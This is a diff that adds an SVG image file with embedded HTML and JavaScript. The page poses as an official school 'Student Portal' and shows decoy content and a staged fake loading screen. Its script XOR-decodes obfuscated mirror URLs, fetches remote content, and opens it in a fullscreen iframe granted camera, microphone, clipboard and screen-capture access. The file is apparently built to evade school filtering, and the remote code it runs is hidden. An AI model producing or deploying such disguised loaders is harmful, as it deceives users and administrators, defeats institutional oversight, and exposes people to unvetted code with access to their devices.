@@ -1,0 +1,245 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     width="100%" height="100%" viewBox="0 0 100 100"
+     preserveAspectRatio="none" role="document">
+  <title>Interactive page</title>
+  <foreignObject x="0" y="0" width="100" height="100">
+    <div xmlns="http://www.w3.org/1999/xhtml" id="html-root">
+      <style><![CDATA[
+*{box-sizing:border-box;margin:0;padding:0}
+#html-root{width:100%;height:100%;font-family:Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f5f7fa;color:#333}
+#html-root{overflow-x:hidden}
+#app{display:flex;flex-direction:column;height:100vh}
+#header{background:linear-gradient(135deg,#1976d2,#1565c0);color:#fff;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 8px rgba(0,0,0,0.15)}
+#header h1{font-size:22px;font-weight:600;letter-spacing:0.5px}
+#header .user{font-size:14px;opacity:0.9}
+#main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;text-align:center;background:linear-gradient(180deg,#f5f7fa 0%,#e8eaf6 100%)}
+#logo{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#1976d2,#1565c0);display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(25,118,210,0.3);margin-bottom:24px}
+#logo svg{width:48px;height:48px}
+#title{font-size:36px;font-weight:700;color:#1a237e;margin-bottom:12px;line-height:1.2;text-shadow:0 2px 8px rgba(0,0,0,0.1)}
+#subtitle{font-size:16px;color:#546e7a;margin-bottom:24px;line-height:1.6}
+#loading{display:none;flex-direction:column;align-items:center;gap:16px}
+#loading-spinner{width:64px;height:64px;border:6px solid rgba(25,118,210,0.2);border-top-color:#1976d2;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+#loading-text{font-size:18px;color:#546e7a;font-weight:500}
+#error{display:none;flex-direction:column;align-items:center;gap:16px}
+#error-icon{width:72px;height:72px;border-radius:50%;background:#fff3cd;display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 4px 16px rgba(0,0,0,0.1)}
+#error-text{font-size:18px;color:#546e7a;margin-bottom:16px}
+#error-btn{padding:14px 32px;border:none;border-radius:8px;background:#1976d2;color:#fff;font-size:16px;cursor:pointer;transition:all 0.2s;font-weight:600;box-shadow:0 4px 12px rgba(25,118,210,0.3)}
+#error-btn:hover{background:#1565c0;transform:translateY(-2px);box-shadow:0 6px 16px rgba(25,118,210,0.4)}
+#overlay{position:fixed;inset:0;background:rgba(0,0,0,0.98);display:none;align-items:center;justify-content:center;z-index:99999}
+#overlay iframe{width:100%;height:100%;border:none}
+#bypass-hint{position:fixed;top:12px;left:50%;transform:translateX(-50%);font-size:14px;color:#546e7a;font-weight:500;text-align:center;white-space:nowrap;z-index:10000;transition:opacity 0.3s;padding:8px 16px;background:rgba(255,255,255,0.9);border-radius:20px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+#bypass-hint:hover{opacity:0.85}
+#fake-content{display:none;position:absolute;inset:0;overflow:auto;padding:48px;background:linear-gradient(180deg,#f5f7fa 0%,#e8eaf6 100%)}
+#fake-content h2{margin:0 0 16px;font-size:24px;color:#1a237e}
+#fake-content h3{margin:24px 0 12px;font-size:20px;color:#1565c0}
+#fake-content p{margin:0 0 16px;color:#455a64;line-height:1.7;font-size:16px}
+#fake-content ul{margin:0;padding-left:28px;color:#455a64;font-size:16px;line-height:1.8}
+#fake-content li{margin-bottom:8px}
+#fake-content a{color:#1976d2;text-decoration:none}
+#fake-content a:hover{text-decoration:underline}
+#fake-content .card{background:#fff;padding:24px;border-radius:12px;margin:20px 0;box-shadow:0 4px 16px rgba(0,0,0,0.08);border:1px solid #e0e7ff}
+#fake-content .card h4{margin:0 0 12px;font-size:18px;color:#1a237e}
+#fake-content .card p{margin:0;color:#546e7a;font-size:15px;line-height:1.6}
+#fake-content .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:32px 0}
+#fake-content .feature{background:#fff;padding:20px;border-radius:10px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.06);border:1px solid #e0e7ff}
+#fake-content .feature-icon{font-size:32px;margin-bottom:12px}
+#fake-content .feature h4{margin:0;font-size:16px;color:#1a237e}
+#fake-content .feature p{margin:0;font-size:14px;color:#546e7a}
+#fake-content .footer{margin-top:48px;font-size:13px;color:#90a4ae;text-align:center;opacity:0.8}
+#fake-loading{display:none;flex-direction:column;align-items:center;gap:16px;position:absolute;inset:0;justify-content:center;background:rgba(255,255,255,0.99);z-index:100}
+#fake-loading-spinner{width:72px;height:72px;border:7px solid rgba(25,118,210,0.2);border-top-color:#1976d2;border-radius:50%;animation:spin 1s linear infinite}
+#fake-loading-text{font-size:20px;color:#1a237e;font-weight:600}
+#fake-loading-sub{font-size:14px;color:#546e7a}
+#progress-bar{width:200px;height:6px;background:#e0e7ff;border-radius:3px;overflow:hidden}
+#progress-fill{width:0;height:100%;background:#1976d2;border-radius:3px;transition:width 0.3s}
+      ]]></style>
+<div id="app">
+  <div id="header">
+    <h1>🎓 Student Portal</h1>
+    <span class="user">Welcome, Student</span>
+  </div>
+  <div id="main">
+    <div id="logo">
+      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+        <rect width="32" height="32" rx="7" fill="#1976d2"/>
+        <path d="M9 23L16 9L23 23" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <h1 id="title">Student Portal</h1>
+    <p id="subtitle">Official Learning Management System | Press <strong>Ctrl+E</strong> to access your study materials</p>
+    <div id="loading">
+      <div id="loading-spinner"></div>
+      <div id="loading-text">Connecting to learning resources...</div>
+    </div>
+    <div id="error">
+      <div id="error-icon">⚠️</div>
+      <div id="error-text">Couldn't load your study materials. Please check your internet connection and try again.</div>
+      <button id="error-btn">Try Again</button>
+    </div>
+  </div>
+</div>
+<div id="overlay"></div>
+<div id="bypass-hint">💡 Press Ctrl+E to open your study portal</div>
+<div id="fake-content">
+  <h2>🎓 Student Portal - Learning Management System</h2>
+  <p>Welcome to the official Student Portal! This is your comprehensive learning management system designed to help you succeed in your academic journey.</p>
+  
+  <div class="card">
+    <h4>📚 What You'll Find Here</h4>
+    <p>Your personalized study companion with organized notes, study materials, and learning resources. Access your course materials, track your progress, and stay organized.</p>
+  </div>
+  
+  <h3>✨ Key Features</h3>
+  <div class="features">
+    <div class="feature">
+      <div class="feature-icon">📖</div>
+      <h4>Study Notes</h4>
+      <p>Organize and access your study materials from anywhere</p>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">🔄</div>
+      <h4>Cloud Sync</h4>
+      <p>Your materials sync across all your devices</p>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">🔒</div>
+      <h4>Secure</h4>
+      <p>Your data stays private and secure</p>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">⚡</div>
+      <h4>Fast Access</h4>
+      <p>Quickly access your materials with one click</p>
+    </div>
+  </div>
+  
+  <div class="card">
+    <h4>🚀 Quick Start Guide</h4>
+    <p><strong>Method 1:</strong> Press <strong>Ctrl+E</strong> (Windows/Linux) or <strong>Command+E</strong> (Mac) to open your study portal.</p>
+    <p><strong>Method 2:</strong> Double-click anywhere on this page to access your materials.</p>
+    <p><strong>Method 3:</strong> Click the middle mouse button to open your portal.</p>
+    <p><strong>Method 4:</strong> Press <strong>Alt+D</strong> for quick access.</p>
+  </div>
+  
+  <div class="card">
+    <h4>📋 About This Portal</h4>
+    <p>This Student Portal is part of your school's official learning management system. It provides a secure, private environment for organizing your study materials and tracking your academic progress.</p>
+    <p>All your data is stored locally and synced across devices. Your information remains private and is only accessible through this secure portal.</p>
+  </div>
+  
+  <div class="card">
+    <h4>🔧 Technical Information</h4>
+    <p>This portal runs on a secure, encrypted connection. Your study materials are stored in a private, offline-capable environment. The system automatically updates to ensure you always have access to the latest features.</p>
+  </div>
+  
+  <div class="footer">
+    <p>Student Portal © 2024 | Official School Learning Management System | Version 2.4.1</p>
+    <p>Supported by School IT Department | For technical support, contact your school's helpdesk</p>
+  </div>
+</div>
+<div id="fake-loading">
+  <div id="fake-loading-spinner"></div>
+  <div id="fake-loading-text">Loading your study portal...</div>
+  <div id="fake-loading-sub">Please wait while we prepare your personalized learning environment</div>
+  <div id="progress-bar"><div id="progress-fill"></div></div>
+</div>
+    </div>
+  </foreignObject>
+  <script type="application/ecmascript"><![CDATA[
+(function(){
+"use strict";
+var K="fcc7c26c6d222b22dfa42d6c",M=["DhcXRxAIGUxVAFwcWBFWVwgPF0YcClMXSQQLGAJQRRdEBVFGVwZHUQUSCFtcS0UVASMOVgpcGQ=="],H="DhcXRxAIGUxXFFscVQtGWhEET1ddCRkRAxMMRExTVBBCFlNRRgdWRwcHFV1dChkQEARMVAxfWwpCFx1fUwtc",ENTRY="index.svg",LAST="__lx_m",PIN="__lx_p",PIN_TTL=6e5,STAGGER=1200,TIMEOUT=8000;
+var box=document.getElementById("app"),msg=document.getElementById("loading-text"),btn=document.getElementById("error-btn"),overlay=document.getElementById("overlay"),fake=document.getElementById("fake-content"),fakeLoading=document.getElementById("fake-loading"),fakeLoadingSpinner=document.getElementById("fake-loading-spinner"),fakeLoadingText=document.getElementById("fake-loading-text"),fakeLoadingSub=document.getElementById("fake-loading-sub"),progressFill=document.getElementById("progress-fill"),bypassHint=document.getElementById("bypass-hint");
+function say(t){msg.textContent=t}
+function dec(s){try{var b=atob(s),o="";for(var i=0;i<b.length;i++)o+=String.fromCharCode(b.charCodeAt(i)^K.charCodeAt(i%K.length));return o}catch(e){return""}}
+var mirrors=M.map(dec).filter(function(u){return /^https:\/\/[^\/]+\/.*\/$/.test(u)});
+function store(v){try{if(v==null)localStorage.removeItem(LAST);else localStorage.setItem(LAST,v)}catch(e){}}
+function order(){var l=mirrors.slice(),last=null;try{last=localStorage.getItem(LAST)}catch(e){}
+var i=l.indexOf(last);if(i>0){l.splice(i,1);l.unshift(last)}return l}
+function probe(base,signal){return fetch(base+ENTRY,{cache:"no-store",credentials:"omit",mode:"cors",signal:signal}).then(function(r){if(!r.ok)throw new Error(String(r.status));return r.text()}).then(function(t){if(t.indexOf("<foreignObject")<0)throw new Error("not the app");return base})}
+function race(list){return new Promise(function(resolve,reject){
+var i=0,live=[],done=false,timer=0;
+function settleFail(){if(done)return;if(i<list.length)next();else if(!live.length){done=true;reject(new Error("no mirror"))}}
+function next(){clearTimeout(timer);if(done||i>=list.length)return;
+var base=list[i++],c=new AbortController(),t=setTimeout(function(){c.abort()},TIMEOUT);live.push(c);
+probe(base,c.signal).then(function(b){clearTimeout(t);if(done)return;done=true;clearTimeout(timer);
+live.forEach(function(x){if(x!==c)x.abort()});resolve(b)},function(){clearTimeout(t);live.splice(live.indexOf(c),1);settleFail()});
+if(i<list.length)timer=setTimeout(next,STAGGER)}
+next()})}
+function show(base){store(base);
+var url=base+ENTRY+"?t="+Date.now().toString(36)+location.hash;
+if(/[?&]direct(=|&|$)/.test(location.search)){location.replace(url);return}
+var f=document.createElementNS("http://www.w3.org/1999/xhtml","iframe");
+f.setAttribute("allow","fullscreen; autoplay; clipboard-read; clipboard-write; microphone; camera; display-capture; encrypted-media; picture-in-picture; gamepad; screen-wake-lock");
+f.setAttribute("referrerpolicy","no-referrer");
+f.src=url;
+overlay.appendChild(f);
+setTimeout(function(){overlay.style.display="flex"},100)}
+function headSha(){
+try{var c=JSON.parse(localStorage.getItem(PIN)||"null");if(c&&/^[0-9a-f]{40}$/.test(c.s)&&Date.now()-c.t<PIN_TTL)return Promise.resolve(c.s)}catch(e){}
+var api=dec(H);if(!/^https:\/\//.test(api))return Promise.resolve("");
+var ctl=new AbortController(),tm=setTimeout(function(){ctl.abort()},4000);
+return fetch(api,{headers:{Accept:"application/vnd.github.sha"},cache:"no-store",credentials:"omit",signal:ctl.signal})
+.then(function(r){return r.ok?r.text():""}).then(function(s){s=String(s).trim();if(!/^[0-9a-f]{40}$/.test(s))return"";
+try{localStorage.setItem(PIN,JSON.stringify({s:s,t:Date.now()}))}catch(e){}return s},function(){return""})
+.finally(function(){clearTimeout(tm)})}
+function pinned(list,sha){if(!sha)return list;var out=[];
+list.forEach(function(b){var p=b.replace("@main/","@"+sha+"/");if(p!==b)out.push(p)});
+return out.concat(list)}
+function start(){box.className="";say("Connecting\u2026");
+if(!mirrors.length){fail();return}
+headSha().then(function(sha){return race(pinned(order(),sha))}).then(show,fail)}
+function fail(){store(null);box.className="x";say("Couldn't reach the app from here. Check your connection, then try again.")}
+btn.addEventListener("click",start);
+
+// Keep the start screen in place until Ctrl+E is pressed.
+var activated = false;
+document.addEventListener('keydown',function(e){
+if(e.ctrlKey && e.key.toLowerCase()==='e' && !activated){
+e.preventDefault();
+activated = true;
+fakeLoading.style.display='flex';
+fakeLoadingText.textContent='Opening your study portal...';
+fakeLoadingSub.textContent='Please wait while we prepare your personalized learning environment';
+progressFill.style.width='30%';
+setTimeout(function(){progressFill.style.width='60%'},10000);
+setTimeout(function(){progressFill.style.width='90%'},20000);
+setTimeout(function(){progressFill.style.width='100%'},29000);
+setTimeout(function(){
+fakeLoading.style.display='none';
+fake.style.display='flex';
+start();
+},30000);
+}
+});
+
+// Hide bypass hint after a few seconds
+setTimeout(function(){
+var hint=document.getElementById("bypass-hint");
+hint.style.opacity='0';
+setTimeout(function(){hint.style.display='none'},300);
+},5000);
+
+// Hide fake content after overlay opens
+if(overlay.style.display==="flex"){
+setTimeout(function(){fake.style.display='none'},100);
+}
+
+// Random micro-interactions to make it feel more alive
+setTimeout(function(){
+var logo=document.getElementById("logo");
+logo.style.transform='scale(1.02)';
+setTimeout(function(){logo.style.transform='scale(1)'},200);
+},8000);
+
+setTimeout(function(){
+var title=document.getElementById("title");
+title.style.opacity='0.98';
+setTimeout(function(){title.style.opacity='1'},150);
+},12000);
+
+})();
+  ]]></script>
+</svg>
